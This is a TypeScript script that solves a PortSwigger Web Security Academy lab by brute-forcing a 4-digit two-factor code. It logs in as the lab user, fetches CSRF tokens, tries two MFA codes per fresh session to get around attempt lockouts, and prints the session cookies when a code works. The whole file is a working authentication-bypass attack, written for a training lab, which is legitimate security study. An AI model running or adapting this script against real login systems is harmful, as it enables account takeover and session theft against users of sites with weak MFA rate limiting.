/**
 * PortSwigger Lab: 2FA bypass using a brute-force attack
 * https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack
 */

import { Sess } from "../base"

const LABID = "0a8d009003d9e47288fe1aa600a70075"

const iter = async (mfa1: number, mfa2: number) => {
	const sess = new Sess()
	const csrf1 = await sess.req`
		GET /login HTTP/1.1
		Upgrade-Insecure-Requests: 1
		Sec-Fetch-Dest: document
		Sec-Fetch-Mode: navigate
		Sec-Fetch-Site: same-origin
		Sec-Fetch-User: ?1
	`.then(r => r.bodreg(/name=\"csrf\" value=\"(.*)\">/)![0])

	await sess.req`
		POST /login HTTP/1.1
		Content-Type: application/x-www-form-urlencoded
		Content-Length: 70
		Origin: https://${LABID}.web-security-academy.net
		Upgrade-Insecure-Requests: 1
		Sec-Fetch-Dest: document
		Sec-Fetch-Mode: navigate
		Sec-Fetch-Site: same-origin
		Sec-Fetch-User: ?1

		csrf=${csrf1}&username=carlos&password=montoya
	`

	const csrf2 = await sess.req`
		GET /login2 HTTP/1.1
		Upgrade-Insecure-Requests: 1
		Sec-Fetch-Dest: document
		Sec-Fetch-Mode: navigate
		Sec-Fetch-Site: same-origin
		Sec-Fetch-User: ?1
	`.then(r => r.bodreg(/name=\"csrf\" value=\"(.*)\">/)![0])

	const r3 = await sess.req`
		POST /login2 HTTP/1.1
		Content-Type: application/x-www-form-urlencoded
		Content-Length: 51
		Origin: https://${LABID}.web-security-academy.net
		Sec-Fetch-Dest: document
		Sec-Fetch-Mode: navigate
		Sec-Fetch-Site: same-origin
		Sec-Fetch-User: ?1

		csrf=${csrf2}&mfa-code=${(mfa1 + "").padStart(4, "0")}
	`

	if (r3.status() === 302) {
		console.log("MFA SUCCESS:", r3.cookies())
		return true
	} else {
		console.log("MFA FAILURE:", mfa1)
	}

	const r4 = await sess.req`
		POST /login2 HTTP/1.1
		Content-Type: application/x-www-form-urlencoded
		Content-Length: 51
		Origin: https://${LABID}.web-security-academy.net
		Upgrade-Insecure-Requests: 1
		Sec-Fetch-Dest: document
		Sec-Fetch-Mode: navigate
		Sec-Fetch-Site: same-origin
		Sec-Fetch-User: ?1

		csrf=${csrf2}&mfa-code=${(mfa2 + "").padStart(4, "0")}
	`

	if (r4.status() === 302) {
		console.log("MFA SUCCESS:", r4.cookies())
		return true
	} else {
		console.log("MFA FAILURE:", mfa2)
	}

	return false
}

for (let i = 0; i < 9999; i++) {
	if (await iter(i, ++i)) {
		break
	}
}
